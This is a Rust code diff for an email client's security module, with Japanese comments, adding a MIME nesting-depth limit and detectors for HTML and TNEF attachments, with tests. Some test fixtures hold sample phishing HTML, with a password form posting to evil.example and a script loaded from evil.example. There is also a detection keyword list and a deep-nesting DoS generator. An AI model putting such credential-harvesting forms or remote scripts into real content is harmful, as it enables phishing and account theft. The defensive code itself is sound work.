@@ -211,13 +211,17 @@ pub enum AuthResult {
 
 /// Parse raw RFC 5322 bytes into an Envelope.
 ///
-/// KTR-07 §3 (STRICT_PARSE_RULES) に従ってストリクトモードを強制:
+/// KTR-07 §3 (STRICT_PARSE_RULES):
 ///   S01 – 複数の Content-Type ヘッダー → 拒否
-///   S02 – MIME 境界不一致 → 拒否  
-///   S03 – 許可リストにない文字セット → U+FFFD で置換してログ
-///   S04 – ネストされた MIME 深度 > 8 → 拒否 (DoS)
+///   S02 – MIME 境界不一致 → 拒否
+///   S03 – 許可リストにない charset → 拒否/置換
+///   S04 – message/rfc822 入れ子深度 > 8 → 拒否 (DoS)
 ///   S05 – 合計デコードサイズ > 100 MB → 拒否
-///   S06 – 不明な Content-Transfer-Encoding 値 → 8bit として扱い、ログ
+///   S06 – 不明な Content-Transfer-Encoding 値 → 8bit として扱い
+///
+/// 現行でこの関数が強制するのは S04/S05 (S01–S03 の生ヘッダ検査は
+/// D168 で導入)。S06 は mail-parser の既定挙動 (未知 CTE を 8bit
+/// 扱い) に従う。
 pub fn parse(raw: &[u8]) -> Result<Envelope, RenderError> {
     // S05: サイズ上限チェック (DoS 対策)
     if raw.is_empty() {
@@ -230,6 +234,18 @@ pub fn parse(raw: &[u8]) -> Result<Envelope, RenderError> {
     let msg = MessageParser::default()
         .parse(raw)
         .ok_or_else(|| RenderError::Parse("MIME parse failed".into()))?;
+
+    // S04: message/rfc822 の入れ子深度 > 8 → 拒否 (DoS)。
+    // mail-parser 自体にも深度制限はあるが、パーサの内部設定に
+    // 依存せず仕様値を自前で強制する。極端に深い入れ子メールは
+    // 再帰スキャン・復号・表示経路それぞれでリソースを使い切る
+    // (D130 で抽出側には MAX_NESTED_DEPTH=16 を置いたが、
+    // parse 段階の拒否は未実装だった)。
+    if max_rfc822_depth(&msg) > 8 {
+        return Err(RenderError::Parse(
+            "S04: nested MIME depth exceeds 8".into(),
+        ));
+    }
 
     // From アドレス群
     let from = msg
@@ -362,6 +378,23 @@ fn addr_to_address(addr: &mail_parser::Addr<'_>) -> Option<Address> {
             domain: email[at + 1..].to_string(),
         },
     })
+}
+
+/// message/rfc822 (`PartType::Message`) の最大入れ子深度を返す。
+///
+/// mail-parser は `msg.parts` にトップレベルのパートを持ち、
+/// rfc822 添付の内部は `PartType::Message(sub)` として再帰する。
+/// multipart の分岐はツリーではなく msg.parts 上でフラットに
+/// 展開されるため、構造的に深さが増すのは rfc822 経路のみ。
+fn max_rfc822_depth(msg: &mail_parser::Message<'_>) -> usize {
+    fn depth(part: &mail_parser::MessagePart<'_>) -> usize {
+        if let mail_parser::PartType::Message(sub) = &part.body {
+            1 + sub.parts.iter().map(depth).max().unwrap_or(0)
+        } else {
+            0
+        }
+    }
+    msg.parts.iter().map(depth).max().unwrap_or(0)
 }
 
 fn parse_auth_results(msg: &mail_parser::Message<'_>) -> AuthResultsHeader {
@@ -2268,6 +2301,89 @@ mod tests {
         assert_eq!(e.link_mismatches.len(), 1);
         assert!(e.link_mismatches[0].shown_text.chars().count() <= 80);
     }
+
+    // ---- D169: HTML/TNEF 添付ベクター ----
+
+    #[test]
+    fn html_extension_attachment_flagged() {
+        let s = scan_attachment_bytes("invoice.html", "text/html", b"<p>hi</p>");
+        assert!(s.risks.iter().any(|r| r.contains("HTML 添付")));
+        assert!(!s.is_dangerous);
+    }
+
+    #[test]
+    fn html_attachment_with_form_is_dangerous() {
+        let body = br#"<html><form action="https://evil.example/login">
+            <input type="password"></form></html>"#;
+        let s = scan_attachment_bytes("login.htm", "text/html", body);
+        assert!(s.is_dangerous);
+    }
+
+    #[test]
+    fn html_attachment_with_script_is_dangerous() {
+        let body = b"<html><script src=\"https://evil.example/x.js\"></script></html>";
+        let s = scan_attachment_bytes("a.html", "text/html", body);
+        assert!(s.is_dangerous);
+    }
+
+    #[test]
+    fn declared_text_html_without_extension_flagged() {
+        let s = scan_attachment_bytes("report", "text/html", b"<p>report</p>");
+        assert!(s.risks.iter().any(|r| r.contains("HTML 添付")));
+    }
+
+    #[test]
+    fn plain_text_attachment_not_html() {
+        let s = scan_attachment_bytes("notes.txt", "text/plain", b"<form>x</form>");
+        assert!(!s.risks.iter().any(|r| r.contains("HTML 添付")));
+        assert!(!s.is_dangerous);
+    }
+
+    #[test]
+    fn tnef_by_filename_flagged() {
+        let s = scan_attachment_bytes("winmail.dat", "application/octet-stream", b"\x78\x9f");
+        assert!(s.risks.iter().any(|r| r.contains("TNEF")));
+        assert!(!s.is_dangerous);
+    }
+
+    #[test]
+    fn tnef_by_declared_mime_flagged() {
+        let s = scan_attachment_bytes("attach.bin", "application/ms-tnef", b"abc");
+        assert!(s.risks.iter().any(|r| r.contains("TNEF")));
+    }
+
+    #[test]
+    fn pdf_attachment_unaffected() {
+        // %PDF magic があれば MIME 偽装検出も通る無害ケース
+        let s = scan_attachment_bytes("doc.pdf", "application/pdf", b"%PDF-1.4 x");
+        assert!(!s
+            .risks
+            .iter()
+            .any(|r| r.contains("HTML") || r.contains("TNEF")));
+    }
+
+    // ---- D170: S04 入れ子深度 ----
+
+    fn nested_rfc822(depth: usize) -> String {
+        let mut raw = "From: a@b.example\r\nSubject: x\r\n\r\ninner".to_string();
+        for _ in 0..depth {
+            raw = format!("Content-Type: message/rfc822\r\n\r\n{raw}");
+        }
+        raw
+    }
+
+    #[test]
+    fn parse_rejects_rfc822_depth_over_eight() {
+        let raw = nested_rfc822(9);
+        let err = parse(raw.as_bytes()).unwrap_err();
+        assert!(err.to_string().contains("S04"));
+    }
+
+    #[test]
+    fn parse_accepts_rfc822_depth_eight() {
+        let raw = nested_rfc822(8);
+        assert!(parse(raw.as_bytes()).is_ok());
+    }
 }
 
 /// カレンダー招待 (ICS) のセキュリティ検査。
@@ -2526,6 +2642,32 @@ pub fn scan_attachment_bytes(filename: &str, declared_mime: &str, full: &[u8]) -
         risks.push(format!("メタデータが含まれます: {r:?}"));
     }
 
+    // 7. HTML 添付 — ブラウザで開くと Kaname のサニタイズ経路を通らない
+    //    偽ログインページになり得る。悪意あるメール添付で HTML が最大級
+    //    の比率を占めるという観測が複数の 2023-2024 レポートで一致
+    //    (Barracuda / Kaspersky)。`.hta` は実行形式として既に遮断済み
+    //    だが、プレーンな .html 添付は誰も見ていなかった。
+    if is_html_like_attachment(filename, &declared_mime) {
+        risks.push(format!(
+            "HTML 添付 ({filename}) — ブラウザで開くと偽ログインページ等に \
+            なり得ます (HTML フィッシングの兆候)"
+        ));
+        if html_attachment_has_active_content(bytes) {
+            risks.push("HTML 添付にスクリプト/フォーム/iframe が含まれます".to_string());
+            is_dangerous = true;
+        }
+    }
+
+    // 8. TNEF (winmail.dat / application/ms-tnef) — 内部に別添付を
+    //    内包できる不透明コンテナ。TNEF パーサを持たないため内部は
+    //    スキャンできない旨を兆候として報告する (危険判定はしない)。
+    if is_tnef_attachment(filename, &declared_mime) {
+        risks.push(
+            "TNEF (winmail.dat) 添付は内部を検査できません — 隠し添付を含む可能性があります"
+                .to_string(),
+        );
+    }
+
     AttachmentScan {
         filename: filename.to_string(),
         declared_mime: declared_mime.to_string(),
@@ -2533,4 +2675,54 @@ pub fn scan_attachment_bytes(filename: &str, declared_mime: &str, full: &[u8]) -
         risks,
         is_dangerous,
     }
+}
+
+/// HTML 添付かどうかの判定 (拡張子または宣言 MIME)。
+///
+/// `.hta` は `is_dangerous_windows_attachment` で遮断済みだが、
+/// プレーンな `.html`/`.htm`/`.shtml`/`.xhtml` はどの検出器も
+/// 見ていなかった — 受信者がブラウザで開くと Kaname の
+/// `sanitize_html` を通らない HTML がそのまま実行され、
+/// 偽ログインページによる認証情報フィッシングの経路になる
+/// (Barracuda/Kaspersky 等の観測では悪意あるメール添付で HTML が
+/// 最大級の比率)。
+#[must_use]
+fn is_html_like_attachment(filename: &str, declared_mime: &str) -> bool {
+    let lower = filename.to_ascii_lowercase();
+    let ext = lower.rsplit('.').next().unwrap_or("");
+    matches!(ext, "html" | "htm" | "shtml" | "xhtml")
+        || declared_mime.to_ascii_lowercase().starts_with("text/html")
+}
+
+/// HTML 添付の中身が能動的コンテンツ (script/form/iframe/password
+/// input) を含むか — 含む場合は単なる兆候ではなく危険扱いする。
+/// 先頭 64 KB のみ検査する (誘導用フォームは冒頭にあるため)。
+#[must_use]
+fn html_attachment_has_active_content(bytes: &[u8]) -> bool {
+    let Ok(text) = std::str::from_utf8(bytes) else {
+        return false;
+    };
+    let head = text.get(..64 * 1024).unwrap_or(text);
+    let lower = head.to_ascii_lowercase();
+    [
+        "<script",
+        "<form",
+        "<input",
+        "<iframe",
+        "type=\"password\"",
+        "type='password'",
+        "type=password",
+    ]
+    .iter()
+    .any(|m| lower.contains(m))
+}
+
+/// TNEF (Transport Neutral Encapsulation Format) 添付かどうか。
+/// `application/ms-tnef` の中身 (典型名 winmail.dat) は RTF 本文や
+/// 別添付を内包できる不透明なバイナリコンテナで、TNEF パーサを
+/// 持たない本実装では内部を検査できない = 検査回避に使える形。
+#[must_use]
+fn is_tnef_attachment(filename: &str, declared_mime: &str) -> bool {
+    filename.to_ascii_lowercase().ends_with("winmail.dat")
+        || declared_mime.eq_ignore_ascii_case("application/ms-tnef")
 }
